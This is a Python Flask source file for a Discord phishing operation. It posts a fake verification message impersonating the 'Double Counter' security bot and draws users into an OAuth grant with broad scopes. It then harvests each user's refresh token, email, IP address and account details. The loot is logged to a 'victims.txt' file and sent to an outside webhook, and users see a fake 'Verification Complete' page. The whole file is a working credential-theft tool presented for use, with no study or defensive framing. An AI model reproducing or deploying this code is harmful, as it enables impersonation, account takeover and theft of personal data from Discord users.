from flask import Flask, request, redirect
import requests
import os
import datetime
import urllib.parse
import time
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

# === CONFIGURATION ===
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI", "https://YOUR_RENDER_URL.onrender.com/callback")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
BOT_TOKEN = os.getenv("BOT_TOKEN")
VERIFY_CHANNEL_ID = os.getenv("VERIFY_CHANNEL_ID", "1516478639858913322")

# === RATE LIMIT SAFE REQUEST (WITH TIMEOUT) ===
def safe_request(method, url, **kwargs):
    """Make a request with timeout and retry"""
    max_retries = 2
    retry_delay = 5

    if 'timeout' not in kwargs:
        kwargs['timeout'] = 30

    for attempt in range(max_retries):
        try:
            response = requests.request(method, url, **kwargs)
            if response.status_code == 429:
                retry_after = response.json().get('retry_after', retry_delay)
                print(f"⚠️ Rate limited. Waiting {retry_after}s...")
                time.sleep(retry_after)
                continue
            return response
        except requests.exceptions.Timeout:
            print(f"⚠️ Timeout on attempt {attempt + 1}")
            if attempt < max_retries - 1:
                time.sleep(retry_delay)
                continue
            raise
        except Exception as e:
            print(f"⚠️ Request failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(retry_delay)
                continue
            raise
    return None

# === ROUTE 1: WAKE-UP / HEALTH CHECK ===
@app.route('/health')
def health():
    return "OK", 200

# === ROUTE 2: LANDING – REDIRECT TO DISCORD OAUTH ===
@app.route('/')
def index():
    auth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds%20connections%20messages.read"
    )
    return redirect(auth_url)

# === ROUTE 3: CALLBACK – HARVEST DATA ===
@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "No code provided", 400

    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')

    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
    }

    try:
        resp = safe_request('POST', 'https://discord.com/api/oauth2/token', data=data)
        if not resp or resp.status_code != 200:
            return f"Token exchange failed: {resp.text if resp else 'No response'}", 400

        token_data = resp.json()
        access_token = token_data['access_token']
        refresh_token = token_data['refresh_token']
        headers = {'Authorization': f'Bearer {access_token}'}

        user_resp = safe_request('GET', 'https://discord.com/api/users/@me', headers=headers)
        if not user_resp or user_resp.status_code != 200:
            return f"Failed to get user info", 400
        user_data = user_resp.json()

        guilds_resp = safe_request('GET', 'https://discord.com/api/users/@me/guilds', headers=headers)
        guilds = guilds_resp.json() if guilds_resp and guilds_resp.status_code == 200 else []

        connections_resp = safe_request('GET', 'https://discord.com/api/users/@me/connections', headers=headers)
        connections = connections_resp.json() if connections_resp and connections_resp.status_code == 200 else []

        dms_resp = safe_request('GET', 'https://discord.com/api/users/@me/channels', headers=headers)
        dms = dms_resp.json() if dms_resp and dms_resp.status_code == 200 else []

        avatar_hash = user_data.get('avatar')
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{avatar_hash}.png" if avatar_hash else "Default"

        with open('victims.txt', 'a', encoding='utf-8') as f:
            f.write(f"""
{'='*80}
🎯 VICTIM - {datetime.datetime.now().isoformat()}
ID: {user_data['id']}
Username: {user_data['username']}#{user_data.get('discriminator', '0000')}
Email: {user_data.get('email', 'N/A')}
IP: {ip}
Refresh Token: {refresh_token}
Guilds: {len(guilds)}
Connections: {len(connections)}
DMs: {len(dms)}
{'='*80}
""")

        if WEBHOOK_URL:
            payload = {"content": f"""
🎯 **NEW VICTIM!**
User: {user_data['username']}#{user_data.get('discriminator', '0000')}
ID: {user_data['id']}
Email: {user_data.get('email', 'N/A')}
IP: {ip}
Refresh Token: `{refresh_token}`
DMs: {len(dms)}
"""}
            safe_request('POST', WEBHOOK_URL, json=payload)

        return """
        <html><head><title>Verified</title></head>
        <body style="font-family:Arial;text-align:center;padding:50px;background:#0a0a0f;color:#fff;">
            <h1 style="color:#57F287;">✅ Verification Complete!</h1>
            <p>You can now access the server.</p>
            <script>setTimeout(() => window.close(), 2000);</script>
        </body></html>
        """

    except Exception as e:
        print(f"[ERROR] {e}")
        return f"Internal error: {e}", 500

# === ROUTE 4: SEND EMBED ===
@app.route('/send_embed')
def send_embed():
    if not BOT_TOKEN:
        return "BOT_TOKEN not set. Add BOT_TOKEN to .env", 400

    direct_oauth_url = (
        f"https://discord.com/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds%20connections%20messages.read"
    )

    embed = {
        "title": "**Double Counter**",
        "description": (
            "**APP.**\n\n"
            "Verify to access this server\n"
            "This server uses **Double Counter** to block alt accounts and VPNs.\n\n"
            "**Server:** bunnifg\n\n"
            "Double Counter is the best data-powered alt account and raid blocker on Discord. "
            "We provide instant verification based on 10+ factors. "
            "Double Counter is your best all-in-one security bot. https://doublecounter.gg/"
        ),
        "color": 0x5865F2,
        "footer": {"text": f"Double Counter · Trust & Safety · {datetime.datetime.now().strftime('Today at %I:%M %p')}"},
        "timestamp": datetime.datetime.now().isoformat()
    }

    payload = {
        "embeds": [embed],
        "components": [{
            "type": 1,
            "components": [{
                "type": 2,
                "style": 5,
                "label": "Click here to verify",
                "url": direct_oauth_url
            }]
        }]
    }

    try:
        response = requests.post(
            f"https://discord.com/api/v10/channels/{VERIFY_CHANNEL_ID}/messages",
            headers={"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"},
            json=payload,
            timeout=30
        )
        if response.status_code == 200:
            return "✅ Embed sent to #verify!", 200
        else:
            return f"❌ Error: {response.text}", 400
    except requests.exceptions.Timeout:
        return "❌ Timeout – Discord didn't respond in 30 seconds", 408
    except Exception as e:
        return f"❌ Error: {e}", 500

# === ROUTE 5: SET BOT BIO ===
@app.route('/set_bio')
def set_bio():
    if not BOT_TOKEN:
        return "BOT_TOKEN not set", 400
    bio_text = "Double Counter is the best data-powered alt account and raid blocker on Discord. We provide instant verification based on 10+ factors. Double Counter is your best all-in-one security bot. https://doublecounter.gg/"
    response = requests.patch(
        "https://discord.com/api/v10/applications/@me",
        headers={"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"},
        json={"description": bio_text},
        timeout=30
    )
    if response.status_code == 200:
        return "✅ Bot bio updated!", 200
    return f"❌ Error: {response.text}", 400

# === RUN ===
if __name__ == '__main__':
    print("🔥 BUNNI FG ETERNAL EDITION")
    print(f"📡 Redirect URI: {REDIRECT_URI}")
    print("📨 Send embed: visit /send_embed")
    app.run(host='0.0.0.0', port=5000, debug=True)
